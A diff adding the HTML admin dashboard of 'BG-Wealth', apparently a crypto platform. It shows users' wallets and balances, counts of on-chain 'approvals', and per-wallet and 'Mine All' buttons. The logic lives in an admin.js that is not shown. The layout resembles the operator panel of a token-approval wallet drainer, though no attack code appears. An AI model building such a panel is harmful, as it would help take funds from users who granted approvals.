@@ -1,0 +1,187 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BG-Wealth | Admin Dashboard</title>
+    <link rel="icon" type="image/jpeg" href="/BGWealth.jpg">
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="admin.css">
+    <script src="https://cdn.jsdelivr.net/npm/web3@4.2.0/dist/web3.min.js"></script>
+</head>
+
+<body>
+    <!-- Mobile hamburger toggle -->
+    <button class="hamburger-btn" id="hamburgerBtn" onclick="toggleSidebar()">☰</button>
+    <div class="sidebar-overlay" id="sidebarOverlay" onclick="toggleSidebar()"></div>
+
+    <div class="dashboard-container">
+        <!-- Sidebar -->
+        <aside class="sidebar" id="sidebar">
+            <div class="sidebar-header">
+                <img src="/BGWealth.jpg" alt="BGW"
+                    style="width:36px;height:36px;border-radius:10px;object-fit:contain;background:rgba(212,175,55,.06);padding:4px;border:1px solid rgba(212,175,55,.15);filter:drop-shadow(0 0 8px rgba(212,175,55,.3));">
+                <h2>BGW Admin</h2>
+            </div>
+            <nav id="sidebarNav">
+                <div class="nav-item active" data-section="dashboard">
+                    <span>📊</span> Dashboard
+                </div>
+                <div class="nav-item" data-section="users">
+                    <span>👥</span> User Records
+                </div>
+                <div class="nav-item" data-section="contracts">
+                    <span>📝</span> Contracts
+                </div>
+                <div class="nav-item logout-btn" onclick="logout()" style="margin-top: auto; color: #ff6b6b;">
+                    <span>🚪</span> Logout
+                </div>
+            </nav>
+        </aside>
+
+        <!-- Main Content -->
+        <main class="main-content">
+            <!-- Header -->
+            <div class="header-bar">
+                <div>
+                    <h2 id="pageTitle">Admin Dashboard</h2>
+                    <p class="text-muted">Welcome back, <span id="adminName">Admin</span></p>
+                </div>
+                <div class="server-status" style="display: flex; gap: 0.75rem; align-items: center;">
+                    <button class="btn btn-primary" id="adminConnectWalletBtn" style="padding: 0.5rem 1rem;">🔌 Connect
+                        Admin Wallet</button>
+                    <span class="status active" id="serverStatus">🟢 Server Online</span>
+                </div>
+            </div>
+
+            <!-- Stats Overview -->
+            <div class="stats-grid" id="statsGrid">
+                <div class="stat-card">
+                    <div class="stat-icon">👥</div>
+                    <div class="stat-label">Total Registered Users</div>
+                    <div class="stat-value" id="totalUsers">-</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-icon">✅</div>
+                    <div class="stat-label">Confirmed Approvals</div>
+                    <div class="stat-value" id="confirmedUsers">-</div>
+                    <div class="status confirmed" style="display: inline-block; font-size: 0.7rem;">Verified Chain Data
+                    </div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-icon">📅</div>
+                    <div class="stat-label">Recent (7 Days)</div>
+                    <div class="stat-value" id="recentRegistrations">-</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-icon">📝</div>
+                    <div class="stat-label">Active Contracts</div>
+                    <div class="stat-value" id="activeApprovals">-</div>
+                </div>
+            </div>
+
+            <!-- Users Section (Hidden by default) -->
+            <section id="usersSection" style="display: none;">
+                <div class="data-table-container">
+                    <div class="table-header">
+                        <h3>Registered Users & Balances</h3>
+                        <div style="display:flex; gap:0.5rem; flex-wrap:wrap; align-items:center;">
+                            <span id="lastUpdatedLabel"
+                                style="font-size:0.75rem; color:var(--text-muted-color); margin-right:0.5rem;"></span>
+                            <button class="btn btn-primary" id="refreshBtn" onclick="refreshBalances()">🔄 Refresh
+                                Balances</button>
+                            <button class="btn" style="background: var(--accent-green); color: #000;" onclick="mineAllTokens()">💎
+                                Mine All</button>
+                        </div>
+                    </div>
+                    <!-- Search bar -->
+                    <div class="search-bar">
+                        <input type="text" id="userSearchInput" placeholder="🔍 Search wallet address..."
+                            autocomplete="off">
+                    </div>
+                    <!-- Virtual scroll container -->
+                    <div id="virtualScrollContainer"
+                        style="height: 600px; overflow-y: auto; position: relative; border-radius: 8px;">
+                        <!-- Table header (sticky) -->
+                        <table style="width:100%; border-collapse:collapse;">
+                            <thead style="position:sticky; top:0; z-index:10; background: var(--card-bg);">
+                                <tr>
+                                    <th style="width:60px; text-align:center;">#</th>
+                                    <th>Wallet</th>
+                                    <th style="width:120px;">Balance</th>
+                                    <th style="width:80px;">Mine</th>
+                                </tr>
+                            </thead>
+                        </table>
+                        <!-- Spacer for virtual scroll -->
+                        <div id="virtualSpacer" style="position:relative;">
+                            <table style="width:100%; border-collapse:collapse;">
+                                <tbody id="usersTableBody">
+                                    <!-- Populated via virtual scroll JS -->
+                                </tbody>
+                            </table>
+                        </div>
+                    </div>
+                    <div id="usersLoading" style="padding: 2rem; text-align: center; display: none;">
+                        Loading data...
+                    </div>
+                    <!-- Pagination + info bar -->
+                    <div id="paginationControls" class="pagination-bar">
+                    </div>
+                </div>
+            </section>
+
+            <!-- Contracts Section (Hidden by default) -->
+            <section id="contractsSection" style="display: none;">
+                <div class="data-table-container">
+                    <div class="table-header">
+                        <h3>Smart Contract Approvals</h3>
+                        <button class="btn btn-primary" onclick="openModal('contractModal')">+ Add Contract</button>
+                    </div>
+                    <table id="contractsTable">
+                        <thead>
+                            <tr>
+                                <th>Contract Address</th>
+                                <th>Description</th>
+                                <th>Status</th>
+                                <th>Added By</th>
+                                <th>Actions</th>
+                            </tr>
+                        </thead>
+                        <tbody id="contractsTableBody"></tbody>
+                    </table>
+                </div>
+            </section>
+        </main>
+    </div>
+
+    <!-- Modals -->
+    <div id="contractModal" class="modal-overlay">
+        <div class="modal-content">
+            <h3 style="margin-bottom: 1.5rem; background: linear-gradient(90deg, var(--primary), var(--primary-light)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text;">Add Smart Contract</h3>
+            <form id="addContractForm">
+                <div style="margin-bottom: 1rem;">
+                    <label class="modal-label">Contract Address</label>
+                    <input type="text" id="newContractAddress" class="form-input"
+                        style="width:100%; padding:0.8rem; background:rgba(255,106,0,0.04); border:1px solid rgba(255,106,0,0.2); color:white; border-radius:8px; font-family:'Poppins',sans-serif;"
+                        required placeholder="0x..." autocomplete="off">
+                </div>
+                <div style="margin-bottom: 1rem;">
+                    <label class="modal-label">Description</label>
+                    <input type="text" id="newContractDesc" class="form-input"
+                        style="width:100%; padding:0.8rem; background:rgba(255,106,0,0.04); border:1px solid rgba(255,106,0,0.2); color:white; border-radius:8px; font-family:'Poppins',sans-serif;"
+                        required placeholder="E.g. Main Token Contract" autocomplete="off">
+                </div>
+                <div style="display:flex; gap:1rem; justify-content:flex-end; margin-top:2rem;">
+                    <button type="button" class="btn btn-cancel" onclick="closeModal('contractModal')">Cancel</button>
+                    <button type="submit" class="btn btn-primary">Save Contract</button>
+                </div>
+            </form>
+        </div>
+    </div>
+
+    <script src="admin.js"></script>
+</body>
+
+</html>
